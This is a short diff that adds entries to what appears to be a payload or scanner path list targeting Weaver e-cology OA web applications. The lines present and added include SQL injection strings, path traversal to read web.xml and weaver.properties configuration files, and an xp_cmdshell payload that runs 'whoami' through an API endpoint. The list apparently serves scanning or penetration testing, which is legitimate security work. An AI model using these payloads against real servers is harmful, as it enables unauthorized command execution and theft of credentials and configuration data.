@@ -9,3 +9,7 @@
 /pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(
 /mysql_config.ini
 /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
+/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+/Api/portal/elementEcodeAddon/getSqlData?sql=exec%20xp_cmd$shell%20%27whoami%27;
+/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties
+/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
